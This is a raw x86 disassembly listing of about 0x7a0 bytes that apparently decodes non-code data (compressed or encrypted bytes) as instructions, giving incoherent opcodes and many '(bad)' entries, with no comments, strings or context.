  421cd4:	repnz inc esp
  421cd6:	in     al,dx
  421cd7:	jae    0x421c91
  421cd9:	cld    
  421cda:	(bad)  
  421cdc:	test   eax,0x59246f5c
  421ce1:	jmp    0x421cac
  421ce3:	jle    0x421d59
  421ce5:	xchg   ebx,eax
  421ce6:	mov    ch,0x5e
  421ce8:	adc    eax,DWORD PTR [edx+0x42]
  421ceb:	pop    esi
  421cec:	xchg   ebx,eax
  421ced:	xchg   ecx,eax
  421cee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421cef:	fisub  WORD PTR [eax]
  421cf1:	inc    ecx
  421cf2:	nop
  421cf3:	inc    esp
  421cf4:	cmp    BYTE PTR [ecx],0x9b
  421cf7:	and    eax,0x56981dea
  421cfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421cfd:	adc    bh,BYTE PTR [esi]
  421cff:	les    ecx,FWORD PTR [ebx]
  421d01:	in     al,dx
  421d02:	in     eax,0xd0
  421d04:	xor    cl,BYTE PTR [ebx+0x6bd3c845]
  421d0a:	or     DWORD PTR [edx+0x38a839a0],edx
  421d10:	sahf   
  421d11:	push   edi
  421d12:	aas    
  421d13:	and    BYTE PTR [edx+0x31a7f72b],al
  421d19:	std    
  421d1a:	jecxz  0x421d09
  421d1c:	mov    ecx,0xa8b83ac0
  421d21:	repz dec ebp
  421d23:	add    eax,0x79b468f1
  421d28:	mov    ds:0xedf6931c,eax
  421d2d:	mov    DWORD PTR [ebp-0x7b],esp
  421d30:	ret    0x1e75
  421d33:	jmp    0x421d89
  421d35:	fucomip st,st(0)
  421d37:	and    DWORD PTR [ecx-0x4774e0fc],ebp
  421d3d:	mov    ds:0x359a9ea9,al
  421d42:	inc    ebx
  421d43:	stos   BYTE PTR es:[edi],al
  421d44:	into   
  421d45:	(bad)  
  421d47:	call   0x28e40084
  421d4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d4d:	mov    bl,0x3b
  421d4f:	dec    BYTE PTR [edx]
  421d51:	icebp  
  421d52:	jno    0x421cfb
  421d54:	rcr    cl,1
  421d56:	cmp    al,bl
  421d58:	stc    
  421d59:	dec    ecx
  421d5a:	addr16 in eax,dx
  421d5c:	outs   dx,BYTE PTR ds:[esi]
  421d5d:	fsub   st,st(2)
  421d5f:	xor    esp,edx
  421d61:	xor    edi,ebp
  421d63:	sub    BYTE PTR [ecx+0x68341283],dl
  421d69:	test   al,0xeb
  421d6b:	pusha  
  421d6c:	test   DWORD PTR [esp+eax*8],0x9d4105b1
  421d73:	js     0x421d78
  421d75:	xchg   BYTE PTR [ebp-0x66091b50],bl
  421d7b:	into   
  421d7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d7d:	outs   dx,DWORD PTR ds:[esi]
  421d7e:	mov    dl,0x75
  421d80:	and    ah,al
  421d82:	inc    edi
  421d83:	and    eax,0xcd97b849
  421d88:	sub    ah,BYTE PTR [esi-0x168a8367]
  421d8e:	fiadd  WORD PTR [edx]
  421d90:	sbb    ah,BYTE PTR [eax+ebp*1]
  421d93:	je     0x421dfb
  421d95:	mov    dl,0x3f
  421d97:	lea    eax,ds:0xdf4687fe
  421d9d:	aam    0x49
  421d9f:	xchg   BYTE PTR [esi-0x3512fdd2],dl
  421da5:	mov    ebx,0xfcd049f3
  421daa:	or     BYTE PTR [edx],0x8f
  421dad:	sti    
  421dae:	test   DWORD PTR [edi+edi*2-0x60],ebp
  421db2:	into   
  421db3:	sti    
  421db4:	push   ss
  421db5:	jo     0x421da5
  421db7:	push   eax
  421db8:	scas   al,BYTE PTR es:[edi]
  421db9:	and    esp,DWORD PTR [eax]
  421dbb:	and    eax,0x58a00cbc
  421dc0:	aas    
  421dc1:	jecxz  0x421df4
  421dc3:	nop
  421dc4:	jno    0x421dae
  421dc6:	jno    0x421db9
  421dc8:	stos   DWORD PTR es:[edi],eax
  421dc9:	dec    eax
  421dca:	mov    al,0x2a
  421dcc:	mov    ds:0x6d784349,al
  421dd1:	and    BYTE PTR [esp+edi*2-0x14],ch
  421dd5:	xor    edi,DWORD PTR [ebp-0x75]
  421dd8:	push   edx
  421dd9:	adc    al,0x10
  421ddb:	test   DWORD PTR [eax],esp
  421ddd:	pop    ebx
  421dde:	or     cl,BYTE PTR [ebx]
  421de0:	mov    dl,0x12
  421de2:	pop    ebp
  421de3:	mov    dh,0xaf
  421de5:	bnd jl 0x421e29
  421de8:	xchg   DWORD PTR [ebx+0x1c46d8be],ebp
  421dee:	adc    DWORD PTR [esi-0x24ecb78f],ebx
  421df4:	rol    BYTE PTR [edi],1
  421df6:	adc    cl,cl
  421df8:	push   edi
  421df9:	mov    WORD PTR [eax+0x43365ca3],ss
  421dff:	fild   WORD PTR [ecx]
  421e01:	push   0x7a13678e
  421e06:	push   esp
  421e07:	jge    0x421e0c
  421e09:	jge    0x421e7c
  421e0b:	imul   esi,DWORD PTR [ebp-0x38dc3f06],0xfffffffa
  421e12:	and    al,0x99
  421e14:	repnz fwait
  421e16:	(bad)  
  421e17:	fild   WORD PTR [edx+0x29]
  421e1a:	xlat   BYTE PTR ds:[ebx]
  421e1b:	fbld   TBYTE PTR [ebx-0x1c]
  421e1e:	push   ecx
  421e1f:	xlat   BYTE PTR ds:[ebx]
  421e20:	fmul   DWORD PTR [edx+0x64a843da]
  421e26:	xor    eax,0x2d2de867
  421e2b:	aas    
  421e2c:	popa   
  421e2d:	push   es
  421e2e:	jae    0x421e98
  421e30:	dec    edi
  421e31:	mov    BYTE PTR [ebx],bh
  421e33:	enter  0xae34,0xba
  421e37:	stos   BYTE PTR es:[edi],al
  421e38:	xchg   ebx,eax
  421e39:	jne    0x421e55
  421e3b:	cmc    
  421e3c:	fs mov edx,0xb0185a4b
  421e42:	jle    0x421e94
  421e44:	and    al,0xf2
  421e46:	cmp    al,0x6c
  421e48:	pop    esi
  421e49:	add    dl,0x90
  421e4c:	call   0xc55767a0
  421e51:	fisubr DWORD PTR [ebx-0x16b944ad]
  421e57:	pop    eax
  421e58:	(bad)  
  421e59:	pop    ebx
  421e5a:	push   0x59
  421e5c:	cmp    BYTE PTR [edx],0xe2
  421e5f:	aam    0xdc
  421e61:	test   BYTE PTR [edi-0x4e6090fa],cl
  421e67:	retf   0x7ae6
  421e6a:	cs icebp 
  421e6c:	xchg   ebp,ebp
  421e6e:	xchg   ebp,eax
  421e6f:	xor    BYTE PTR [ebp+0x32],al
  421e72:	dec    edx
  421e73:	mov    dl,0xc7
  421e75:	jmp    0x421e29
  421e77:	sahf   
  421e78:	xor    DWORD PTR [edx-0x5e],esi
  421e7b:	xchg   ebx,eax
  421e7c:	push   ds
  421e7d:	in     al,0xd5
  421e7f:	into   
  421e80:	fs push 0x4b43499b
  421e86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e87:	push   0xfffffff1
  421e89:	mov    esp,0x5a66e39d
  421e8e:	xor    esi,DWORD PTR [ebp+0x449a514d]
  421e94:	mov    cl,0xba
  421e96:	icebp  
  421e97:	mov    esp,0xe591cd17
  421e9c:	(bad)  
  421e9d:	fscale 
  421e9f:	or     esp,ebp
  421ea1:	mov    esi,0xf797e30e
  421ea6:	rol    ebp,0xe2
  421ea9:	in     al,0x81
  421eab:	cvttps2pi mm2,QWORD PTR [edi-0x70]
  421eaf:	lods   eax,DWORD PTR ds:[esi]
  421eb0:	mov    dl,0xed
  421eb2:	lahf   
  421eb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421eb4:	mov    ch,0xe7
  421eb6:	imul   ebp,DWORD PTR [ecx+0x20889b81],0xfffffff5
  421ebd:	jle    0x421f1f
  421ebf:	mov    eax,0x272aca4b
  421ec4:	dec    esp
  421ec5:	call   0x2bd8:0x1245c8b2
  421ecc:	adc    edi,ebp
  421ece:	ss popf 
  421ed0:	add    eax,0x231ee385
  421ed5:	fs inc esp
  421ed7:	mov    BYTE PTR [eax-0x21],ah
  421eda:	pop    esp
  421edb:	sbb    eax,0x76d29907
  421ee0:	jp     0x421ecb
  421ee2:	les    ebx,FWORD PTR [ebp+0x2d89488b]
  421ee8:	jle    0x421f22
  421eea:	movaps XMMWORD PTR [edi+0x2639ebba],xmm4
  421ef1:	fistp  WORD PTR [eax]
  421ef3:	xchg   edi,eax
  421ef4:	add    eax,0xefa9d5e2
  421ef9:	ins    DWORD PTR es:[edi],dx
  421efa:	cmp    eax,0x9bd27273
  421eff:	sub    esp,esi
  421f01:	jo     0x421e87
  421f03:	push   ds
  421f04:	inc    ebx
  421f05:	push   es
  421f06:	rcl    DWORD PTR [esi],cl
  421f08:	cmp    bl,BYTE PTR [ecx+0x44]
  421f0b:	dec    ebp
  421f0c:	dec    eax
  421f0d:	sbb    BYTE PTR [ecx+0x2dfd4562],ah
  421f13:	mov    dl,0x12
  421f15:	mov    ebp,0xa9dd5707
  421f1a:	mov    ebx,0xe76ad931
  421f1f:	inc    ebx
  421f20:	sbb    al,0x61
  421f22:	repnz fst DWORD PTR [ebp-0xf98c674]
  421f29:	jbe    0x421f60
  421f2b:	xchg   esp,eax
  421f2c:	jle    0x421ece
  421f2e:	ja     0x421eec
  421f30:	mov    dl,0xe9
  421f32:	or     BYTE PTR [edx+0x229b1221],dh
  421f38:	je     0x421f89
  421f3a:	or     eax,0xd7e6ae49
  421f3f:	adc    BYTE PTR [ebx-0x7a],al
  421f42:	pop    ebx
  421f43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f45:	sbb    esi,DWORD PTR [esi-0x29]
  421f48:	psubsw mm5,QWORD PTR [ebx-0x3226ff33]
  421f4f:	mul    DWORD PTR [ebx-0xe746bdc]
  421f55:	xchg   edx,eax
  421f56:	mov    cl,BYTE PTR [ebx+0x6a]
  421f59:	mov    edi,ecx
  421f5b:	test   ecx,0x59e85732
  421f61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f62:	loopne 0x421f69
  421f64:	pop    es
  421f65:	jo     0x421efe
  421f67:	mov    dl,0x77
  421f69:	(bad)  
  421f6a:	pop    edx
  421f6b:	test   BYTE PTR [ecx+0x4ee6ab6c],bh
  421f71:	jg     0x421f75
  421f73:	dec    eax
  421f74:	ud2    
  421f76:	xor    BYTE PTR [ebx-0x2d],ch
  421f79:	adc    ah,BYTE PTR [ebx]
  421f7b:	mov    dh,0x32
  421f7d:	fld    DWORD PTR [ecx-0x39b2aca1]
  421f83:	xchg   edx,eax
  421f84:	jle    0x421f14
  421f86:	xor    ch,bh
  421f88:	mov    DWORD PTR [edx+0x19bf7a69],edx
  421f8e:	adc    BYTE PTR [eax],dh
  421f90:	mov    dh,ch
  421f92:	xchg   esi,eax
  421f93:	add    BYTE PTR [esi+edx*1],ah
  421f96:	or     al,ch
  421f98:	jns    0x421fdb
  421f9a:	cdq    
  421f9b:	mov    es,ebp
  421f9d:	(bad)  
  421f9e:	push   esp
  421f9f:	adc    al,0x27
  421fa1:	retf   
  421fa2:	sub    BYTE PTR [ebx+0x33],al
  421fa5:	pushf  
  421fa6:	out    dx,eax
  421fa7:	and    esp,DWORD PTR [ebx]
  421fa9:	jle    0x421fe7
  421fab:	shr    ebp,0x75
  421fae:	popa   
  421faf:	adc    eax,0x739a65db
  421fb4:	ins    DWORD PTR es:[edi],dx
  421fb5:	icebp  
  421fb6:	sbb    eax,0xa518e13a
  421fbb:	aas    
  421fbc:	or     al,BYTE PTR [edi+0x3]
  421fbf:	lods   al,BYTE PTR ds:[esi]
  421fc0:	dec    esi
  421fc1:	cdq    
  421fc2:	clc    
  421fc3:	mov    al,BYTE PTR [edi]
  421fc5:	ret    
  421fc6:	adc    eax,DWORD PTR [ecx-0x22]
  421fc9:	push   ds
  421fca:	jmp    0x421f97
  421fcc:	ret    0x188c
  421fcf:	pusha  
  421fd0:	sub    esp,DWORD PTR [esi]
  421fd2:	jp     0x421fe4
  421fd4:	scas   al,BYTE PTR es:[edi]
  421fd5:	mov    ebx,DWORD PTR [ebx+0x44]
  421fd8:	lahf   
  421fd9:	(bad)  
  421fda:	cld    
  421fdb:	inc    esp
  421fdc:	push   eax
  421fdd:	sub    edi,eax
  421fdf:	and    ebp,ecx
  421fe1:	inc    edi
  421fe2:	dec    edx
  421fe3:	les    edx,FWORD PTR [edi*8+0x10a57ef7]
  421fea:	dec    esp
  421feb:	or     al,0x47
  421fed:	dec    edx
  421fee:	jb     0x421ff0
  421ff0:	retf   0x586c
  421ff3:	loopne 0x42201d
  421ff5:	loopne 0x421ff5
  421ff7:	test   DWORD PTR [ecx+ebx*4],ecx
  421ffa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421ffb:	outs   dx,DWORD PTR ds:[esi]
  421ffc:	retf   0x55d4
  421fff:	adc    BYTE PTR [esi-0x2f],ah
  422002:	push   esp
  422003:	mov    ecx,esp
  422005:	imul   edx,ecx
  422008:	pop    ds
  422009:	stos   BYTE PTR es:[edi],al
  42200a:	aam    0x7d
  42200c:	stos   BYTE PTR es:[edi],al
  42200d:	mov    ds:0x7cba8339,eax
  422012:	test   eax,0x8e7b8fee
  422017:	push   ecx
  422018:	mov    edx,0xb400c2
  42201d:	or     al,0xd4
  42201f:	pop    edi
  422020:	retf   
  422021:	sub    eax,0xb887d9dd
  422026:	mov    ss,WORD PTR [edi]
  422028:	out    dx,eax
  422029:	std    
  42202a:	jecxz  0x42205e
  42202c:	push   ebp
  42202d:	adc    BYTE PTR [ecx+0x48],0x6a
  422031:	jp     0x422007
  422033:	inc    edx
  422034:	outs   dx,DWORD PTR ds:[esi]
  422035:	jnp    0x42205c
  422037:	je     0x422028
  422039:	sbb    bl,BYTE PTR [eax-0x4a5647df]
  42203f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422040:	lods   al,BYTE PTR ds:[esi]
  422041:	mov    ecx,0x5bbe6556
  422046:	push   ebp
  422047:	stos   DWORD PTR es:[edi],eax
  422048:	cwde   
  422049:	mov    ds,WORD PTR [ebx+0x20147bef]
  42204f:	outs   dx,DWORD PTR ds:[esi]
  422050:	into   
  422051:	call   0x146b:0x20289bc6
  422058:	dec    ebp
  422059:	mov    ch,0x64
  42205b:	mul    BYTE PTR [eax-0x27]
  42205e:	push   ebp
  42205f:	repnz push es
  422061:	cmc    
  422062:	push   esi
  422063:	sbb    eax,0x5815b634
  422068:	out    dx,al
  422069:	sbb    BYTE PTR [edx+0x76],ch
  42206c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42206d:	adc    ch,bh
  42206f:	pop    es
  422070:	hlt    
  422071:	push   ds
  422072:	clc    
  422073:	adc    BYTE PTR [edx],dh
  422075:	in     al,0x29
  422077:	mov    ecx,0xa6aa9336
  42207c:	clc    
  42207d:	xchg   ecx,eax
  42207e:	sbb    cl,BYTE PTR [esi-0x28]
  422081:	lods   eax,DWORD PTR ds:[esi]
  422082:	mov    ds:0xc19642a7,eax
  422087:	xchg   edx,eax
  422088:	push   es
  422089:	call   0xee60b805
  42208e:	and    DWORD PTR [esi+0x77],0x35c6bfa2
  422095:	into   
  422096:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422097:	adc    al,0xea
  422099:	lahf   
  42209a:	inc    eax
  42209b:	mov    al,ds:0x989b6e51
  4220a0:	adc    BYTE PTR [ecx],ah
  4220a2:	addr16 and eax,0xb8315f0b
  4220a8:	mov    bl,0x6a
  4220aa:	and    BYTE PTR [eax+0x0],0x81
  4220ae:	sbb    esi,DWORD PTR [eax-0x735aca7c]
  4220b4:	mov    ah,0x7
  4220b6:	aad    0x3d
  4220b8:	ins    BYTE PTR es:[edi],dx
  4220b9:	scas   al,BYTE PTR es:[edi]
  4220ba:	and    eax,0x20daa9ab
  4220bf:	lods   eax,DWORD PTR ds:[esi]
  4220c0:	push   edx
  4220c1:	stos   BYTE PTR es:[edi],al
  4220c2:	sub    ch,bl
  4220c4:	lds    ecx,FWORD PTR [ebp+0x74]
  4220c7:	or     BYTE PTR [esi+0xf75fa5b],bl
  4220cd:	mov    ds:0xb8dacedc,al
  4220d2:	(bad)  
  4220d3:	fsub   DWORD PTR [edi]
  4220d5:	out    0xea,eax
  4220d7:	fs adc bl,ch
  4220da:	jle    0x4220ce
  4220dc:	push   ebx
  4220dd:	out    dx,al
  4220de:	or     al,BYTE PTR [esi]
  4220e0:	sbb    edx,esi
  4220e2:	xor    eax,DWORD PTR [edx+0x58]
  4220e5:	jge    0x42209a
  4220e7:	push   es
  4220e8:	cld    
  4220e9:	fs retf 
  4220eb:	jae    0x422082
  4220ed:	inc    ecx
  4220ee:	dec    ebp
  4220ef:	xchg   esi,eax
  4220f0:	aad    0xd4
  4220f2:	scas   al,BYTE PTR es:[edi]
  4220f3:	sbb    eax,0xb8310d39
  4220f8:	mov    ebx,0x63788681
  4220fd:	scas   eax,DWORD PTR es:[edi]
  4220fe:	stos   BYTE PTR es:[edi],al
  4220ff:	add    DWORD PTR [ebx-0x5f],edx
  422102:	stos   BYTE PTR es:[edi],al
  422103:	sbb    bl,bl
  422105:	nop
  422106:	mov    cl,0x57
  422108:	and    ecx,DWORD PTR [edx-0x26]
  42210b:	mov    esp,0xdc82ba7c
  422110:	jbe    0x42218f
  422112:	ins    BYTE PTR es:[edi],dx
  422113:	pop    edi
  422114:	(bad)  
  422115:	mov    bl,0xdb
  422117:	pop    edi
  422118:	inc    edx
  422119:	inc    ebx
  42211a:	and    BYTE PTR [esi+0x45],bl
  42211d:	js     0x422157
  42211f:	inc    esp
  422120:	lods   eax,DWORD PTR ds:[esi]
  422121:	inc    edx
  422122:	and    bh,BYTE PTR [eax-0x341cef2]
  422128:	cmp    edi,esi
  42212a:	fisub  DWORD PTR [eax]
  42212c:	mov    DWORD PTR [eax-0xe],0xd1394990
  422133:	in     al,0xf5
  422135:	add    edi,DWORD PTR [esi-0x446a5c1b]
  42213b:	mov    al,ds:0x3e223b3
  422140:	cld    
  422141:	cmp    BYTE PTR ds:0xf8b04c9d,0x9f
  422148:	call   0x23f3968
  42214d:	sub    esp,ebx
  42214f:	push   eax
  422150:	sub    ecx,DWORD PTR [esi]
  422152:	stc    
  422153:	test   eax,0xad033340
  422158:	(bad)  
  422159:	adc    ch,BYTE PTR [edx*4-0x577641f2]
  422160:	xor    ebp,DWORD PTR [ebp+0x2]
  422163:	lods   eax,DWORD PTR ds:[esi]
  422164:	cmp    dh,BYTE PTR [eax]
  422166:	add    DWORD PTR [eax-0x735809d5],0x619da486
  422170:	sub    al,0x94
  422172:	pusha  
  422173:	mov    edx,?
  422175:	arpl   WORD PTR [ebp+edi*2-0x539b624c],si
  42217c:	icebp  
  42217d:	mov    eax,0x62baf017
  422182:	dec    eax
  422183:	lea    ebp,[esi-0x10]
  422186:	mov    bl,0x13
  422188:	mov    ds:0xad964648,al
  42218d:	je     0x42219f
  42218f:	add    al,0x13
  422191:	stc    
  422192:	stos   DWORD PTR es:[edi],eax
  422193:	adc    bl,bh
  422195:	mov    ds:0xe88b9589,eax
  42219a:	jo     0x42214d
  42219c:	mov    ds:0x3ac91872,al
  4221a1:	mov    WORD PTR [ecx+0x5a64f167],?
  4221a7:	lahf   
  4221a8:	dec    eax
  4221a9:	inc    ebp
  4221aa:	pop    edx
  4221ab:	and    eax,0xacecd475
  4221b0:	imul   edx,ebx,0xd64869af
  4221b6:	sub    BYTE PTR [esi+0x20],al
  4221b9:	sub    edx,DWORD PTR [ecx+0x4beb6747]
  4221bf:	sbb    DWORD PTR [ecx-0x66ec01bd],0xffffff8f
  4221c6:	addr16 push 0x80103e8f
  4221cc:	mov    bh,0x6d
  4221ce:	ret    
  4221cf:	xchg   esp,eax
  4221d0:	jecxz  0x4221b8
  4221d2:	push   DWORD PTR [eax]
  4221d4:	(bad)  
  4221d5:	fiadd  WORD PTR [ecx]
  4221d7:	inc    edx
  4221d8:	aad    0x8f
  4221da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4221db:	jb     0x4221a9
  4221dd:	es test al,0x87
  4221e0:	push   0xffffff95
  4221e2:	test   al,0xba
  4221e4:	inc    eax
  4221e5:	sbb    al,0xc3
  4221e7:	adc    esi,DWORD PTR [edx+0x3f0fa4e9]
  4221ed:	add    cl,BYTE PTR [edx+0x5681b652]
  4221f3:	and    DWORD PTR [ebp-0x3d9d40e1],ebx
  4221f9:	into   
  4221fa:	add    ecx,DWORD PTR [ebx]
  4221fc:	lahf   
  4221fd:	ja     0x42222d
  4221ff:	das    
  422200:	scas   eax,DWORD PTR es:[edi]
  422201:	mov    gs,WORD PTR [ebx+ebp*4-0x48]
  422205:	fs ss (bad) 
  422208:	lahf   
  422209:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42220a:	out    dx,al
  42220b:	loopne 0x4221f6
  42220d:	data16 aad 0x7f
  422210:	das    
  422211:	pop    esp
  422212:	adc    BYTE PTR [eax+0x2b],al
  422215:	pop    ss
  422216:	xlat   BYTE PTR ds:[ebx]
  422217:	inc    DWORD PTR [edx+edx*8-0x7b513153]
  42221e:	je     0x422284
  422220:	cmp    DWORD PTR [ebx],edi
  422222:	fdiv   QWORD PTR [ecx]
  422224:	jmp    0xbc8c8d09
  422229:	push   esi
  42222a:	pop    ebx
  42222b:	pop    ebp
  42222c:	pop    ss
  42222d:	pop    esi
  42222e:	xor    ah,bl
  422230:	xor    al,cl
  422232:	or     esp,DWORD PTR [edx+0x38]
  422235:	pop    ss
  422236:	sbb    eax,0x15ab6c7b
  42223b:	repz cmp esi,ebx
  42223e:	add    al,0x48
  422240:	xor    eax,0xe769ce16
  422245:	sub    eax,0xf33ed0fe
  42224a:	xchg   edx,eax
  42224b:	repz clc 
  42224d:	fwait
  42224e:	mov    bh,0x7d
  422250:	repz sub BYTE PTR [eax-0x25526722],cl
  422257:	fmul   QWORD PTR [esp+ebx*8+0x7f377659]
  42225e:	lods   eax,DWORD PTR ds:[esi]
  42225f:	cli    
  422260:	push   cs
  422261:	jge    0x42222c
  422263:	out    dx,al
  422264:	add    BYTE PTR [ecx+0x469d33e3],dh
  42226a:	adc    DWORD PTR [eax],0xbfe0d183
  422270:	in     al,0x49
  422272:	cs mov cl,0xe4
  422275:	outs   dx,BYTE PTR ds:[esi]
  422276:	adc    eax,0x200a7120
  42227b:	pop    eax
  42227c:	lock mov edi,0xafdf737
  422282:	(bad)  
  422283:	sar    BYTE PTR [eax-0x23],cl
  422286:	mov    al,ds:0x5063fb35
  42228b:	jmp    FWORD PTR [eax]
  42228d:	in     al,0x1b
  42228f:	imul   esp,DWORD PTR [ebx+0x56],0xffffffaf
  422293:	pop    eax
  422294:	shl    DWORD PTR [eax+edi*4],cl
  422297:	outs   dx,DWORD PTR ds:[esi]
  422298:	call   0xbdee:0x1862c811
  42229f:	adc    BYTE PTR ds:0x6735b372,ah
  4222a5:	push   ebx
  4222a6:	adc    al,0x26
  4222a8:	(bad)  
  4222a9:	popf   
  4222aa:	inc    esp
  4222ab:	or     BYTE PTR [ebx],ah
  4222ad:	(bad)  
  4222ae:	jno    0x4222ab
  4222b0:	sub    eax,0xb88ec35a
  4222b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4222b6:	mov    al,fs:0xdabf0576
  4222bc:	sbb    al,0xf5
  4222be:	aad    0xc6
  4222c0:	xchg   edi,eax
  4222c1:	shl    ah,0xf9
  4222c4:	fdiv   DWORD PTR [ebx]
  4222c6:	sbb    BYTE PTR [eax-0x5aaee0ec],0xaa
  4222cd:	add    al,0x5b
  4222cf:	imul   ecx,DWORD PTR [eax+0x328c30e2],0x6f
  4222d6:	push   edx
  4222d7:	mov    dh,0x1e
  4222d9:	jg     0x422311
  4222db:	push   ds
  4222dc:	mov    edi,0x3cc32f74
  4222e1:	xor    esp,eax
  4222e3:	pushf  
  4222e4:	and    al,0x0
  4222e6:	test   eax,0xb7c3d14d
  4222eb:	or     dh,BYTE PTR [eax]
  4222ed:	outs   dx,BYTE PTR ds:[esi]
  4222ee:	and    eax,0xbf24b5dc
  4222f3:	retf   
  4222f4:	jp     0x4222ab
  4222f6:	push   esi
  4222f7:	les    di,DWORD PTR [esi+0x5888c9ef]
  4222fe:	lahf   
  4222ff:	cmc    
  422300:	push   eax
  422301:	aad    0x8d
  422303:	push   ebx
  422304:	loope  0x42234c
  422306:	sub    DWORD PTR [ebp-0x69],esp
  422309:	popa   
  42230a:	pushf  
  42230b:	das    
  42230c:	idiv   DWORD PTR [edx+0x72]
  42230f:	test   eax,0xc0c9e2fd
  422314:	out    0x81,eax
  422316:	imul   edx,DWORD PTR [ebx],0x4b
  422319:	shr    dl,cl
  42231b:	daa    
  42231c:	jne    0x422396
  42231e:	sbb    eax,0xa308738a
  422323:	sub    eax,0x43880fb4
  422328:	test   BYTE PTR [edi-0x6c77be0d],ch
  42232e:	icebp  
  42232f:	jns    0x422336
  422331:	add    cl,BYTE PTR [edx]
  422333:	fsubp  st(2),st
  422335:	in     al,0x86
  422337:	mov    DWORD PTR [ebx],0xcc18d7ad
  42233d:	or     eax,DWORD PTR [edi-0x7f6a6f9b]
  422343:	lahf   
  422344:	cmc    
  422345:	scas   al,BYTE PTR es:[edi]
  422346:	std    
  422347:	int3   
  422348:	xchg   esp,eax
  422349:	sub    al,0x28
  42234b:	mov    ebp,0x362cb547
  422350:	and    eax,0x9a16c232
  422355:	inc    eax
  422356:	xchg   BYTE PTR [ebp+0x64],dl
  422359:	addr16 inc ecx
  42235b:	scas   al,BYTE PTR es:[edi]
  42235c:	jl     0x42237a
  42235e:	jmp    0x4223d8
  422360:	push   esi
  422361:	mov    bl,0xcb
  422363:	data16 ja 0x422300
  422366:	int3   
  422367:	cmc    
  422368:	jle    0x42237e
  42236a:	cmp    esi,ebx
  42236c:	jp     0x422336
  42236e:	out    0xf2,eax
  422370:	jl     0x422370
  422372:	fistp  WORD PTR [edx+0x15bdaa38]
  422378:	jnp    0x42230d
  42237a:	shl    DWORD PTR [esi],0x8b
  42237d:	out    dx,eax
  42237e:	mov    DWORD PTR [esi+0x7c],eax
  422381:	(bad)  
  422382:	jnp    0x4223d3
  422384:	shr    BYTE PTR [edi-0xe0d34db],0x55
  42238b:	xchg   esi,eax
  42238c:	jbe    0x422402
  42238e:	stos   BYTE PTR es:[edi],al
  42238f:	sbb    al,BYTE PTR [edi+edi*4]
  422392:	test   BYTE PTR [ebx],bl
  422394:	cmp    bl,ah
  422396:	dec    ebx
  422397:	adc    BYTE PTR [edx],ch
  422399:	aaa    
  42239a:	ins    DWORD PTR es:[edi],dx
  42239b:	rcl    BYTE PTR [ebp+0x1e],0x77
  42239f:	(bad)  
  4223a0:	cld    
  4223a1:	aam    0x83
  4223a3:	xor    BYTE PTR [ebx-0x65],cl
  4223a6:	pop    edx
  4223a7:	lods   al,BYTE PTR ds:[esi]
  4223a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4223a9:	xor    ch,BYTE PTR [edi+0x67]
  4223ac:	ss push ds
  4223ae:	mov    dl,0xbc
  4223b0:	cmc    
  4223b1:	je     0x422337
  4223b3:	fbstp  TBYTE PTR [edx-0x78fe9dfd]
  4223b9:	dec    edx
  4223ba:	jmp    0xdf70:0xb9c9be7c
  4223c1:	jb     0x4223ff
  4223c3:	js     0x42237a
  4223c5:	hlt    
  4223c6:	push   0xffffff89
  4223c8:	repnz mov dh,0xf6
  4223cb:	push   0x68
  4223cd:	cmp    DWORD PTR [edi+0x4fc30727],ebx
  4223d3:	(bad)  
  4223d4:	adc    al,ah
  4223d6:	gs int 0x86
  4223d9:	div    DWORD PTR [eax]
  4223db:	dec    edx
  4223dc:	pop    ecx
  4223dd:	jnp    0x422434
  4223df:	outs   dx,DWORD PTR ds:[esi]
  4223e0:	push   esp
  4223e1:	ins    BYTE PTR es:[edi],dx
  4223e2:	sbb    al,BYTE PTR ds:0x89d47e
  4223e8:	es ss test eax,0x7d3b629c
  4223ef:	dec    esi
  4223f0:	push   0xfffffff5
  4223f2:	push   edi
  4223f3:	hlt    
  4223f4:	adc    BYTE PTR [ebp-0x60],bh
  4223f7:	fidiv  DWORD PTR [ebx+0x18]
  4223fa:	and    eax,DWORD PTR [esp+esi*4-0x6a936b23]
  422401:	mov    DWORD PTR ds:0xe7c7c9ca,0x91411aeb
  42240b:	sbb    eax,0x6cf5681e
  422410:	test   eax,0x582a8cfb
  422415:	lds    ecx,FWORD PTR [ecx+0x35f47003]
  42241b:	jg     0x4223cc
  42241d:	je     0x4223c7
  42241f:	fsub   QWORD PTR [eax+eiz*2+0x6b61515c]
  422426:	popf   
  422427:	out    0x32,al
  422429:	out    dx,eax
  42242a:	push   es
  42242b:	inc    ebp
  42242c:	imul   edi,DWORD PTR [edx+0x35],0xce3c594d
  422433:	sar    DWORD PTR [edx+0x6d],cl
  422436:	into   
  422437:	stos   BYTE PTR es:[edi],al
  422438:	ds xchg ecx,eax
  42243a:	popa   
  42243b:	cmp    esi,DWORD PTR fs:0x552d91c
  422442:	add    ch,0x51
  422445:	pop    ebp
  422446:	xchg   esi,eax
  422447:	cmp    al,0xf4
  422449:	mov    eax,ds:0x445d2284
  42244e:	shl    BYTE PTR [eax+edi*4+0x5d],0xc0
  422453:	push   ebx
  422454:	in     al,0xfc
  422456:	pop    ebp
  422457:	mov    al,0xc9
  422459:	dec    esp
  42245a:	sbb    bh,BYTE PTR [ebp-0x63b08b86]
  422460:	arpl   WORD PTR [ebx+0x33e890c0],cx
  422466:	arpl   WORD PTR [ecx],di
  422468:	mov    dl,0xc0
  42246a:	aas    
  42246b:	add    ebp,DWORD PTR [esi+ebx*2]
  42246e:	aaa    
  42246f:	xchg   edi,eax
  422470:	push   es
  422471:	retf   
  422472:	jbe    0x4223fd
  422474:	das    
